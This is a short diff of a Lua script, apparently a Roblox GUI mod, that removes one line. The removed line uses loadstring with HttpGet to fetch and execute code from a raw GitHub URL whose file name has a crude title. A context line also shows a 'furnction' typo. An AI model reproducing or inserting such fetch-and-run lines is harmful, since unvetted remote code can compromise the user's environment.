@@ -48,9 +48,6 @@ frame.InputEnded:Connect(furnction(input)
     end
 end)
 
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysad/universal-gui/refs/heads/main/jerk%20off%20r6"))()
-
-
 -- Create Speed TextBox and Button
 local speedTextBox = Instance.new("TextBox")
 speedTextBox.Size = UDim2.new(0, 200, 0, 50)
